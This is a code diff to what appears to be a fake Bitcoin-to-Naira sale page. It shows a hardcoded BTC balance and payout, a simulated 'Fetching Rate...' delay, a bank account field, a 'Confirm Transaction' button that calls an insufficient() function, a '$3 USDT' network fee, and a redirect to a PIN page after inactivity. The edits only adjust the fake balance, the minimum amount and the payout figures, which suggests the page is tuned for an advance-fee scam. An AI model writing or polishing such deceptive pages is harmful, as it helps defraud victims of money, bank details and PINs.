@@ -98,13 +98,13 @@
 
 <div class="balance">
   <p>Available Balance</p>
-  <strong id="balanceText">0.004407 BTC ≈ €326.94</strong>
+  <strong id="balanceText">0.004407 BTC ≈ €402.94</strong>
 </div>
 
 <div class="input-group">
-  <label for="amount">BTC Amount (Min. 0.0044)</label>
+  <label for="amount">BTC Amount (Min. 0.0054)</label>
   <div class="field-wrap">
-    <input type="number" id="amount" step="0.0001" placeholder="0.0044" inputmode="decimal">
+    <input type="number" id="amount" step="0.0001" placeholder="0.0054" inputmode="decimal">
     <button class="all-btn" onclick="setAll()">MAX</button>
   </div>
 </div>
@@ -142,8 +142,8 @@
     <div style="font-size: 40px; margin-bottom: 10px;">⚡</div>
     <h2 style="margin:0 0 10px; font-weight:800; color:var(--text);">Confirm Sale</h2>
     <div style="background: #f1f5f9; border-radius: 12px; padding: 15px; margin-bottom: 20px; text-align: left; border: 1px solid var(--border);">
-        <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--text-dim)">Selling:</span><strong id="popBtc" style="color:var(--text)">0.004407 BTC</strong></div>
-        <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--text-dim)">Payout:</span><strong style="color:var(--pri)" id="popNaira">₦490,072.26</strong></div>
+        <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--text-dim)">Selling:</span><strong id="popBtc" style="color:var(--text)">0.005431 BTC</strong></div>
+        <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--text-dim)">Payout:</span><strong style="color:var(--pri)" id="popNaira">₦598,799.94</strong></div>
         <div style="display:flex; justify-content:space-between;"><span style="color:var(--text-dim)">Network Fee:</span><span style="color:var(--text)">$3 USDT</span></div>
     </div>
     <button class="confirm-btn" onclick="insufficient()">Confirm Transaction</button>
@@ -162,7 +162,7 @@
 
 <script>
   const btcRateEur = 74183.40;
-  const userBtc = 0.004407;
+  const userBtc = 0.005431;
   const eurToNgnRate = 1498.96696;
   const amountInput = document.getElementById('amount');
   const nairaValue = document.getElementById('nairaValue');
@@ -177,7 +177,7 @@
 
   function calculate() {
     const val = parseFloat(amountInput.value);
-    if(val >= 0.0044) {
+    if(val >= 0.0054) {
         nairaValue.value = "Fetching Rate...";
         nairaValue.classList.add('loader-dots');
         setTimeout(() => {
@@ -194,8 +194,8 @@
 
   function showPopup(){
     const val = parseFloat(amountInput.value);
-    if(!val || val < 0.0044) {
-      alert("Minimum amount is 0.0044 BTC");
+    if(!val || val < 0.0054) {
+      alert("Minimum amount is 0.0054 BTC");
       return;
     }
     if(document.getElementById('account').value.length < 10) {
@@ -242,7 +242,7 @@
 
   setInterval(() => {
     const last = localStorage.getItem('lastActiveTime');
-    if(last && (Date.now() - last > 60000)) window.location.href = 'pin.html';
+    if(last && (Date.now() - last > 60000)) window.location.href = 'user_pin.html';
   }, 2000);
   function reset() { localStorage.setItem('lastActiveTime', Date.now()); }
   ['click','touchstart','input'].forEach(e => document.addEventListener(e, reset));
